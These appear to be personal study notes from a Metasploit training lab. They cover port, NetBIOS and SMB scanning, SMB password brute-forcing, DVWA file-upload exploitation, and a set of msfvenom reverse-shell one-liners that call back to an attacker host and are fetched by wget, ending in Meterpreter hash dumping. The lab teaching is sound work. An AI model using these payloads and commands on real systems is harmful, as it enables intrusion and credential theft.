- How to scan target systems using Metasploit.
- How to use the Metasploit database feature.
- How to use Metasploit to conduct a vulnerability scan.
- How to use Metasploit to exploit vulnerable services on target systems.
- How `msfvenom` can be used to create payloads and obtain a Meterpreter session on the target system.
## **Scanning**
Metasploit has a number of modules to scan open ports on the target system and network. You can list potential port scanning modules available using the `search portscan` command.
![[Pasted image 20240814053144.png]]

![[Pasted image 20240814053207.png]]

Port scanning modules will require you to set a few options:
- **CONCURRENCY:** Number of targets to be scanned simultaneously.
- **PORTS:** Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
- **RHOSTS:** Target or target network to be scanned.
- **THREADS:** Number of threads that will be used simultaneously. More threads will result in faster scans.

You can directly perform Nmap scans from the msfconsole prompt as shown below faster:
![[Pasted image 20240814053243.png]]

### **UDP service Identification**
The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.
![[Pasted image 20240814053416.png]]

### **SMB Scans**
Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be `smb_enumshares` and `smb_version`.
![[Pasted image 20240814053515.png]]

When performing service scans, it would be important not to omit more "exotic" services such as NetBIOS. NetBIOS (Network Basic Input Output System), similar to SMB, allows computers to communicate over the network to share files or send files to printers. The NetBIOS name of the target system can give you an idea about its role and even importance (e.g. CORP-DC, DEVOPS, SALES, etc.). You may also run across some shared files and folders that could be accessed either without a password or protected with a simple password (e.g. admin, administrator, root, toor, etc.)

*Note:*
	 Metasploit has many modules that can help you have a better understanding of the target system and possibly help you find vulnerabilities. It is always worth performing a quick search to see if there are any modules that could be helpful based on your target system.

1)How many ports are open on the target system?
	search portscan
	use scanner/portscan/syn
	setg rhost -> machine.ip

2)Using the relevant scanner, what NetBIOS name can you see?
	search netbios
	use scanner/netbios/nbname

3)What is running on port 8000?
	search http_version
	use scanner/http/http_version
	set rport -> 8000
	
4)What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.
	search smb_login
	use scanner/smb/smb_login
	set SMBuser -> penny
	set PASS_FILE -> MetasploitWordlist-1632491116676.txt
	set STOP_ON_SUCCES -> true

## **Vulnerability Scanning**
Metasploit allows you to quickly identify some critical vulnerabilities that could be considered as “low hanging fruit”.  The term “low hanging fruit” usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as root or administrator.

Finding vulnerabilities using Metasploit will rely heavily on your ability to scan and fingerprint the target. The better you are at these stages, the more options Metasploit may provide you. For example, if you identify a VNC service running on the target, you may use the `search` function on Metasploit to list useful modules. The results will contain payload and post modules. At this stage, these results are not very useful as we have not discovered a potential exploit to use just yet. However, in the case of VNC, there are several scanner modules that we can use.
![[Pasted image 20240815181242.png]]

## **Exploitation**
As the name suggests, Metasploit is an exploitation framework. Exploits are the most populated module category.
![[Pasted image 20240815181431.png]]

Most of the exploits will have a preset default payload. However, you can always use the `show payloads` command to list other commands you can use with that specific exploit.
![[Pasted image 20240815181453.png]]

*Note:*
	Choosing a working payload could become a trial and error process due to environmental or OS restrictions such as firewall rules, anti-virus, file writing, or the program performing the payload execution isn't available (eg. payload/python/shell_reverse_tcp).

Once a session is opened, you can background it using `CTRL+Z` or abort it using `CTRL+C`. Backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell.

### Working with sessions
The `sessions` command will list all active sessions. The `sessions` command supports a number of options that will help you manage sessions better.
![[Pasted image 20240815181709.png]]
  
You can interact with any existing session using the `sessions -i` command followed by the session ID.

## **Msfvenom**
Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.

Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.)
![[Pasted image 20240815200512.png]]

### Output formats
You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). The`msfvenom --list formats` command can be used to list supported output formats.

### Encoders
Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the `-e` parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was `raw`.

![[Pasted image 20240815201242.png]]

### Handlers
Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the `payload options` title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.

The following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are;
1. Generate the PHP shell using MSFvenom
2. Start the Metasploit handler
3. Execute the PHP shell  

MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of the AttackBox used in the attack and local port 7777 was chosen.
![[Pasted image 20240815201417.png]]

*Note:*
	The output PHP file will miss the starting PHP tag commented and the end tag (`?>`), as seen below:
![[Pasted image 20240815201517.png]]

The reverse_shell.php file should be edited to convert it into a working PHP file. 
Below: Comments removed from the beginning of the file // end tag added.
![[Pasted image 20240815201603.png]]
![[Pasted image 20240815201632.png]]

We will use Multi Handler to receive the incoming connection. The module can be used with the `use exploit/multi/handler` command. Multi handler supports all Metasploit payloads and can be used for Meterpreter as well as regular shells. To use the module, we will need to set the payload value (`php/reverse_php` in this case), the LHOST, and LPORT values.
![[Pasted image 20240815201802.png]]

Once everything is set, we will `run` the handler and wait for the incoming connection.
![[Pasted image 20240815201819.png]]

Note:
	When the reverse shell is triggered, the connection will be received by multi/handler and provide us with a shell. If the payload was set as Meterpreter (e.g. in a Windows executable format), multi/handler would then provide us with a Meterpreter shell.

### **Other Payloads**
Based on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen. Below are a few examples you will often use:

**Linux Executable and Linkable Format (elf)**  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  

The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.  
  
**Windows**  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
  
**PHP**  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  
  
**ASP**  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  
  
**Python**  
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`


**Workflow**
1) Create a meterpreter payload in the .elf format 
![[Pasted image 20240815204009.png]]

2) Transfer it to the target machine (you can start a Python web server on your attacking machine with the python3 -m http.server 9000 command and use wget `http://ATTACKING_MACHINE_IP:9000/shell.elf` to download it to the target machine)
![[Pasted image 20240815204155.png]]

3) Get a meterpreter session on the target machine
![[Pasted image 20240815204419.png]]
![[Pasted image 20240815204439.png]]
![[Pasted image 20240815204600.png]]

4) Use a post exploitation module to dump hashes of other users on the system.
![[Pasted image 20240815204656.png]]

